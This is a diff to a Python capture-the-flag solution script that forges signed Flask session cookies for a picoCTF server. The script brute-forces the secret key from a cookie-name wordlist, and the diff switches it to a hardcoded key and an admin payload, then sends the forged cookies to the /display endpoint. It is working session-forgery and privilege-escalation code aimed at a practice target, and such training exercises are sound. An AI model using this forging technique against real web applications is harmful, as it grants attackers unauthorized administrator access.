@@ -8,7 +8,9 @@ from flask.sessions import SecureCookieSessionInterface
 url = "http://mercury.picoctf.net:53700"
 
 cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
-cookie_data = '{ "very_auth":"admin" }'
+# cookie_data = '{ "very_auth":"admin" }'
+cookie_data = '{"auth":True, "username":"admin"}'
+secret_key = "35fe478a110d92aa9a86727e6a3a0895"
 
 # Creating cookies
 
@@ -34,7 +36,7 @@ def encode(secret_key, session_cookie_structure):
 
 def send_request():
     for i in cookie_names:
-        cookie_new = encode(i, cookie_data)
+        cookie_new = encode(secret_key, cookie_data)
         print(cookie_new)
         r = requests.get(url+"/display", cookies={"session": cookie_new}, allow_redirects=False)
         print(len(r.text))
